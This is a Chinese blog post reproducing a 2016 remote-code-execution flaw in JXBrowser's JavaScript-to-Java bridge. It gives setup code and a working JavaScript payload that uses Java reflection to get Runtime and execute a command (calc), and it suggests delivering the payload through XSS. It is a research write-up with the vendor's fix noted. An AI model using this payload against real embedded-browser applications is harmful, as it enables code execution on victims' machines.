---
layout:		post
title:		JXBrowser JavaScript/Java bridge RCE
data:		2016-12-14
author:		"dogewatch"
header-img:	"img/post-bg-js-module.jpg"
tags:
    - web
    - 漏洞
---

> heiweigo

# 前言

BurpSuite的实验室出的漏洞报告，然后知道创宇的404实验室翻译了一下，不过个人觉得这篇翻译真的就只是翻译，可能是因为这个洞影响不大吧。对于对JAVA无限陌生的我来说，索性自己调一下好了。[原文链接](http://blog.portswigger.net/2016/12/rce-in-jxbrowser-javascriptjava-bridge.html)

# 正文

## JXBrowser

JXBrowser是一个基于chromium的JAVA浏览器组件，支持各种操作平台，常用来作为java应用的内置浏览器，而这个漏洞是PortSwigger实验室在今年12月发布在他们博客上的。

## RCE和调试

漏洞的主要原因是因为JXBrowser支持的javascript调用java时，没有对调用java的属性和方法做限制，导致可以直接命令执行。

### 搭建环境

官网下载最新版的[JXBrowser6.9](http://cloud.teamdev.com/downloads/jxbrowser/jxbrowser-6.9-cross-desktop-win_mac_linux.zip)，同时还需要领一份期限30天的许可证书。然后就可以开始建一个测试项目了，我用的是IntelliJ IDEA(毕竟学生免费)，在项目中导入刚才下载的所有jar包和license.jar。
![img](/img/post/jxbrowser-1.png)

### 复现

在JXBrowser中，建立JAVA和JavaScript之间的连接主要靠Browser类下的onScriptContextCreated方法。

```java
Browser browser = new Browser();
......
......
browser.addScriptContextListener(new ScriptContextAdapter() {
            @Override
            public void onScriptContextCreated(ScriptContextEvent event) {
                Browser browser = event.getBrowser();
                JSValue window = browser.executeJavaScriptAndReturnValue("window");
                window.asObject().setProperty("someObj", new someJavaClass());
            }
        });
```

通过`JSValue window = browser.executeJavaScriptAndReturnValue("window");`获取浏览器的BOM对象后，就能用`setProperty`将java的类设置到javascript里去了。这里我们新建一个someJavaClass类用来输出一些信息。(因为在JXBrowser里还不知道能不能打开devtools来查看调试信息)

```java
public class someJavaClass {
    public void javaFunction(String message){
        System.out.println(message);
    }
}
```

java部分的代码就到这了，通过给window对象添加了一个java自己的类完成java到javascript之间的连接。而在javascript代码中，则可以通过这个类直接做到命令执行。

漏洞作者提供了一段代码来检测windows下的java对象是否存在

```javascript
setTimeout(function f(){
	if(window.someObj && typeof window.someObj.javaFunction === 'function'){
		window.someObj.javaFunction("Called Java function from JavaScript");
	}else{
		setTimeout(f, 0);
	}
}, 0);
```

这个时候就可以用`window.someObj`来搞事了。首先试一下getRuntime()能不能获取到运行实例

```javascript
window.someObj.getClass().forName('java.lang.Runtime').getRuntime();  
```

却提示找不到runtime方法：

```
Neither public field nor method named 'getRuntime' exists in the java.lang.Class Java object.
```

但我们可以试试用反射的方法来获取当前的运行实例：

```javascript
field = window.someObj.getClass().forName('java.lang.Runtime').getDeclaredField("currentRuntime");  
```

很幸运地发现没有报错，这意味着离弹计算器只差一步了

```javascript
try{
	field = window.someObj.getClass().forName('java.lang.Runtime').getDeclaredField("currentRuntime");  
	field.setAccessible(true);  
	runtime = field.get(1);  
	runtime.exec("calc");  
}catch(error){
	window.someObj.javaFunction(error);
}
```

boom！
![img](/img/post/jxbrowser-2.png)

### 作者遇到的一些问题

作者在getRuntime()失败后居然没想到用反射来试试，反而去尝试了一些别的方法。

在使用ProcessBuilder的时候失败了

```javascript
window.someObj.getClass().forName("java.lang.ProcessBuilder").newInstance("open","-a Calculator");
```

报错信息是

```
NoSuchMethodException: java.lang.Class.newInstance(java.lang.String)
```

作者说这是参数类型错误，需要一个数组，但是在我这里的报错信息可以看到，根本都没有获取到ProcessBuilder对象。随后他尝试使用java.net.Socket 来建立一个连接，能够成功创建这个对象，但是在调用connect方法时又遇到了问题，参数类型不对，javascript的数组和java的数组不是一个类型，而且在javascript代码中没办法将其转换成java的类型。

### 利用场景猜测与官方的修补措施

说实话因为对JAVA开发一片茫然，所以这个漏洞的利用场景只是在调试过程中突发想到了一个点。假如说某款java应用内置了这个JXBrowser浏览器，那么攻击者可以在默认页面或者是这个应用的其他页面中找到JAVA与Javascript连接的那个对象，这个对象必然是会在js代码中声明的。然后就可以构造攻击代码嵌入到自己的页面或者是利用该应用页面中的XSS把攻击代码嵌入到应用的页面中，最好是在默认页面上有个XSS。一旦受害者用这个JXBrowser浏览器打开这这些页面，就成功触发了payload，完成了攻击。

目前官方的解决办法是添加了一个[@JSAccessible](https://jxbrowser.support.teamdev.com/support/solutions/articles/9000099124--jsaccessible)来设置可以调用的方法的白名单，但是如果开发者没有使用这个功能的话，则依然存在这个漏洞。

# 后记

讲道理这个洞还是挺简单的，就是利用方式需要对java有所了解才能想得到。题外话：现在写markdown都用Typora了，挺好用的。但是之前发现了他们一个本地域的XSS漏洞报告给他们之后居然只是得到个感谢，蛋蛋地忧桑，对个人开发者果然不能奢望太多。
![img](/img/post/jxbrowser-3.png)